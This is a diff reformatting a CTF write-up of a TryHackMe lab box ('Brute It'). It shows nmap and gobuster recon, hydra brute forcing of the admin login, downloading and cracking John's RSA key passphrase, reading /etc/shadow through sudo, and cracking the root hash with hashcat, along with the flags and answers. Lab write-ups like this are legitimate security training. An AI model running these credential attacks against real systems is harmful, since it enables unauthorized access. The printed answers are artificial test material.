@@ -1,10 +1,17 @@
-## Task 1: About this box
+---
+custom_edit_url: null
+pagination_next: null
+pagination_prev: null
+---
 
+## Task 1: About this box
 ### Deploy the machine
 ### No answer needed
 
+&nbsp;
+
 ## Task 2: Reconnaissance
-## Search for open ports using nmap. How many ports are open?
+### Search for open ports using nmap. How many ports are open?
 - Let's perform a `nmap` scan against the machine.
 ```
 $ nmap -sC -sV 10.10.30.186
@@ -27,42 +34,47 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 27.11 seconds
 ```
 - As we can see there are two open ports:
-	- Port 22: ssh
-	- Port 80: http
-## Answer
+
+| Port | Service  |
+|--|--|
+| 22 | ssh |
+| 80 | http |
+### Answer
 ```
 2
 ```
 
-## Question 
-> What version of SSH is running?
+&nbsp;
+
+### What version of SSH is running?
 - The answer is present in the `nmap` scan,
-## Answer
+### Answer
 ```
 OpenSSH 7.6p1
 ```
 
-## Question
-> What version of Apache is running?
+&nbsp;
+
+### What version of Apache is running?
 - The answer is in the `nmap` scan.
-## Answer
+### Answer
 ```
 2.4.29
 ```
 
-## Question
-> Which Linux distribution is running?
+&nbsp;
+
+### Which Linux distribution is running?
 
 - The answer is in the `nmap` scan.
-## Answer
+### Answer
 ```
 Ubuntu
 ```
 
-## Question
-> Search for hidden directories on web server.  
-> What is the hidden directory?
+&nbsp;
 
+### Search for hidden directories on web server. What is the hidden directory?
 - Let's brute force the web pages using `gobuster`.
 ```
 $ gobuster dir -u http://10.10.30.186 -w /usr/share/wordlists/dirb/common.txt
@@ -91,19 +103,24 @@ Progress: 4614 / 4615 (99.98%)
 Finished
 =============================================================== 
 ```
-## Answer
+### Answer
 ```
 /admin
 ```
 
-# Task 2: Getting a shell
-## Question
-> What is the user:password of the admin panel?
+&nbsp;
+
+## Task 2: Getting a shell
+### What is the user:password of the admin panel?
 
 - Let's go to the `admin/` directory.
-![[2 86.png]]
+
+![2](https://github.com/Knign/Write-ups/assets/110326359/37b68183-6329-49a4-9acf-f8aaed6cb39b)
+
 - We can check the source code using  `CTRL+U`.
-![[3 65.png]]
+
+![3](https://github.com/Knign/Write-ups/assets/110326359/c99d5669-21ec-4307-8060-88d15e86109d)
+
 - Now that we know the username, we can use `hydra` to brute force the password.
 ```
 $ hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.30.186 http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:F=username or password invalid"
@@ -116,15 +133,18 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-12-07 09:48:
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-12-07 09:49:25
 ```
-## Answer
+### Answer
 ```
 admin:xavier
 ```
-## Question
-> Crack the RSA key you found.  
-> What is John's RSA Private Key passphrase?> 
+
+&nbsp;
+
+##$ Crack the RSA key you found. What is John's RSA Private Key passphrase?
 - Let's login with `admin` as the username and `xavier` as the password.
-![[4 51.png]]
+
+![4](https://github.com/Knign/Write-ups/assets/110326359/8926dd22-3fbc-45c3-8f40-29f627bc8c2a)
+
 - Let's download the `RSA private key`. for the user `john`.
 ```
 $ wget http://10.10.30.186/admin/panel/id_rsa
@@ -156,13 +176,14 @@ rockinroll       (id_rsa)
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
 ```
-## Answer
+### Answer
 ```
 rockinroll
 ```
 
-## Question
-> user.txt
+&nbsp;
+
+### user.txt
 - Let's change the permissions of the `id_rsa` file.
 ```
 $ chmod 700 id_rsa 
@@ -199,22 +220,22 @@ user.txt
 john@bruteit:~$ cat user.txt 
 THM{a_password_is_not_a_barrier}
 ```
-## Answer
+### Answer
 ```
 THM{a_password_is_not_a_barrier}
 ```
 
-## Question
-> Web flag
+### Web flag
 - The web flag was present on the page with the RSA private key.
+### Answer
 ```
 THM{brut3_f0rce_is_e4sy}
 ```
 
-# Task 4: Privilege Escalation
-## Question
-> Find a form to escalate your privileges.  
-> What is the root's password?
+&nbsp;
+
+## Task 4: Privilege Escalation
+### Find a form to escalate your privileges. What is the root's password?
 - Let's check what files `john` has the permission to execute.
 ```
 john@bruteit:~$ sudo -l
@@ -266,18 +287,21 @@ john:$6$iODd0YaH$BA2G28eil/ZUZAV5uNaiNPE0Pa6XHWUFp7uNTp2mooxwa4UzhfC0kjpzPimy1sl
 $ echo $6$zdk0jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6MJYPUTAaWu4infDjI88U9yUXEVgL > root_hash
 ```
 - We have to find the correct for SHA-512.
-![[5 36.png]]
+
+![5](https://github.com/Knign/Write-ups/assets/110326359/d9c4b88b-0258-47b3-b00a-3bf9bcbd6e60)
+
 - Let's run `hashcat` in order to crack this hash.
 ```
 $ hashcat -a 0 -m 1800 root_hash.txt /usr/share/wordlists/rockyou.txt
 ```
-## Answer
+### Answer
 ```
 football
 ```
 
-## Question
-> root.txt
+&nbsp;
+
+### root.txt
 - Let's switch to the `root` user.
 ```
 john@bruteit:~$ su root
@@ -290,7 +314,7 @@ root@bruteit:/home/john# cd /root
 root@bruteit:~# cat root.txt
 THM{pr1v1l3g3_3sc4l4t10n}
 ```
-## Answer
+### Answer
 ```
 THM{pr1v1l3g3_3sc4l4t10n}
 ```
